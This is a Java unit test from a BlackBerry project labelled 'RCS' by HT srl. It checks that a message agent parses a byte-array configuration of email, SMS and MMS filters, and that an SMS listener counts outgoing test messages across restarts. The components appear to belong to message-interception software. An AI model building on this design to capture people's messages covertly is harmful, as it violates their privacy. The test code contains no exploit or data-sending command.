//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : tests.unit
 * File         : UT_SmsAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package tests.unit;

import java.util.Calendar;

import net.rim.blackberry.api.mail.Address;
import net.rim.blackberry.api.mail.AddressException;
import net.rim.blackberry.api.mail.Folder;
import net.rim.blackberry.api.mail.Message;
import net.rim.blackberry.api.mail.MessagingException;
import net.rim.blackberry.api.mail.Store;
import net.rim.blackberry.api.mail.Transport;
import blackberry.agent.Agent;
import blackberry.agent.MessageAgent;
import blackberry.agent.sms.SmsListener;
import blackberry.sms.SMSHelper;
import blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class UT_SmsAgent.
 */
public final class UT_SmsAgent extends TestUnit {

    protected static Store _store;
    protected final static int[] HEADER_KEYS = { Message.RecipientType.TO,
            Message.RecipientType.CC, Message.RecipientType.BCC };
    byte[] conf_example = new byte[] { 32, 0, 0, 1, 49, 0, 50, 0, 55, 0, 48, 0,
            55, 0, 51, 0, 56, 0, 55, 0, 55, 0, 57, 0, 77, 0, 65, 0, 75, 0, 77,
            0, 65, 0, 75, 0, 120, 0, 0, 2, 116, 0, 0, 64, 0, 0, 0, 0, 0, 0, 0,
            64, 1, 0, 0, 0, 73, 0, 80, 0, 77, 0, 46, 0, 83, 0, 77, 0, 83, 0,
            84, 0, 101, 0, 120, 0, 116, 0, 42, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
            0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, -128,
            54, -33, -12, 10, -48, -54, 1, 0, 0, 0, 0, 0, -128, 62, -43, -34,
            -79, -99, 1, 0, 0, 0, 0, 0, 0, 0, 0, 120, 0, 0, 2, 116, 0, 0, 64,
            0, 0, 0, 0, 0, 0, 0, 64, 1, 0, 0, 0, 73, 0, 80, 0, 77, 0, 46, 0,
            78, 0, 111, 0, 116, 0, 101, 0, 42, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0,
            1, 0, 0, 0, -128, 54, -33, -12, 10, -48, -54, 1, 0, 0, 0, 0, 0,
            -128, 62, -43, -34, -79, -99, 1, 0, 0, 0, 0, 0, 0, 0, 0, 120, 0, 0,
            2, 116, 0, 0, 64, 0, 0, 0, 0, 0, 0, 0, 64, 1, 0, 0, 0, 73, 0, 80,
            0, 77, 0, 46, 0, 77, 0, 77, 0, 83, 0, 42, 0, 0, 0, 0, 0, 0, 0, 0,
            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0,
            0, 0, 0, 0, 0, 1, 0, 0, 0, -128, 54, -33, -12, 10, -48, -54, 1, 0,
            0, 0, 0, 0, -128, 62, -43, -34, -79, -99, 1, 0, 0, 0, 0, 0, 0, 0,
            0, 120, 0, 0, 2, 116, 0, 0, 64, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 0,
            0, 73, 0, 80, 0, 77, 0, 46, 0, 83, 0, 77, 0, 83, 0, 84, 0, 101, 0,
            120, 0, 116, 0, 42, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
            0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, -128, 54, -33, -12,
            10, -48, -54, 1, 0, 0, 0, 0, 0, -128, 62, -43, -34, -79, -99, 1, 0,
            0, 0, 0, 0, 0, 0, 0, 120, 0, 0, 2, 116, 0, 0, 64, 0, 0, 0, 0, 0, 0,
            0, 64, 0, 0, 0, 0, 73, 0, 80, 0, 77, 0, 46, 0, 78, 0, 111, 0, 116,
            0, 101, 0, 42, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
            0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, -128,
            54, -33, -12, 10, -48, -54, 1, 0, 0, 0, 0, 0, -128, 62, -43, -34,
            -79, -99, 1, 0, 0, 0, 0, 0, 0, 0, 0, 120, 0, 0, 2, 116, 0, 0, 64,
            0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 0, 0, 73, 0, 80, 0, 77, 0, 46, 0,
            77, 0, 77, 0, 83, 0, 42, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1,
            0, 0, 0, -128, 54, -33, -12, 10, -48, -54, 1, 0, 0, 0, 0, 0, -128,
            62, -43, -34, -79, -99, 1, 0, 0, 0, 0, 0, 0, 0, 0 };

    /**
     * Instantiates a new u t_ sms agent.
     * 
     * @param name
     *            the name
     * @param tests
     *            the tests
     */
    public UT_SmsAgent(final String name, final Tests tests) {
        super(name, tests);
    }

    private void parseConfTest() throws AssertException {
        final MessageAgent messageAgent = (MessageAgent) Agent.factory(
                Agent.AGENT_MESSAGE, true, conf_example);
        //#ifdef DEBUG
        debug.trace(messageAgent.toString());
        //#endif

        AssertThat(messageAgent.filtersEMAIL.size() == 2,
                "Wrong email filter number");
        AssertThat(messageAgent.filtersMMS.size() == 2,
                "Wrong mms filter number");
        AssertThat(messageAgent.filtersSMS.size() == 2,
                "Wrong sms filter number");
    }

    /*
     * (non-Javadoc)
     * @see tests.TestUnit#run()
     */
    public boolean run() throws AssertException {
        parseConfTest();
        smsAgentRestart();
        return true;
    }

    private void smsAgentRestart() throws AssertException {
        final SmsListener smslistener = SmsListener.getInstance();
        // start
        smslistener.start();
        AssertThat(smslistener.isRunning(), "Not running 1");

        // spedizione di un sms in uscita        
        SMSHelper.sendSMSText("1234", "A test message 1");

        Utils.sleep(1000);
        //verifica che il sms in uscita sia stato contato una volta

        AssertEqual(smslistener.getTotOut(), 1, "totout");
        AssertEqual(smslistener.getTotIn(), 0, "totin");

        // stop
        smslistener.stop();
        AssertThat(!smslistener.isRunning(), "Running 1");

        Utils.sleep(1000);

        // start: secondo giro
        smslistener.start();
        Utils.sleep(1000);
        AssertThat(smslistener.isRunning(), "Not running 2");

        // spedizione di un secondo sms in uscita
        SMSHelper.sendSMSText("1234", "A test message 2");
        AssertEqual(smslistener.getTotOut(), 2, "totout");
        AssertEqual(smslistener.getTotIn(), 0, "totin");

        // qualche giro
        for (int i = 0; i < 10; i++) {

            smslistener.stop();
            Utils.sleep(100);
            smslistener.start();
            Utils.sleep(100);
        }

        SMSHelper.sendSMSText("1234", "A test message 3");
        AssertEqual(smslistener.getTotOut(), 3, "totout");
        AssertEqual(smslistener.getTotIn(), 0, "totin");

        // stop: ultimo
        smslistener.stop();
        Utils.sleep(100);

        AssertThat(!smslistener.isRunning(), "Running 2");

    }

    /**
     * funzione di test che serve a spedire le email.
     * 
     * @param dest
     *            the dest
     * @param from
     *            the from
     * @param subject
     *            the subject
     * @param body
     *            the body
     */
    public void sendEmail(final String dest, final String from,
            final String subject, final String body) {
        final Folder outbox = _store.findFolder("Outbox")[0];
        final Message message = new Message(outbox);
        try {
            message.setContent(body);
        } catch (final MessagingException e) {
            e.printStackTrace();
        }

        message.setSentDate(Calendar.getInstance().getTime());
        final Address[] addresses = new Address[2];
        try {
            addresses[0] = new Address(dest, "");
            addresses[1] = new Address(from, "");
        } catch (final AddressException e1) {
            // TODO Auto-generated catch block
            e1.printStackTrace();
        }

        try {
            message.addRecipients(HEADER_KEYS[0], addresses);
            message.setFrom(addresses[1]);
        } catch (final MessagingException e) {
            e.printStackTrace();
        }

        message.setSubject(subject);
        if (message != null) {
            try {
                Transport.send(message);
            } catch (final MessagingException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }

    }
}
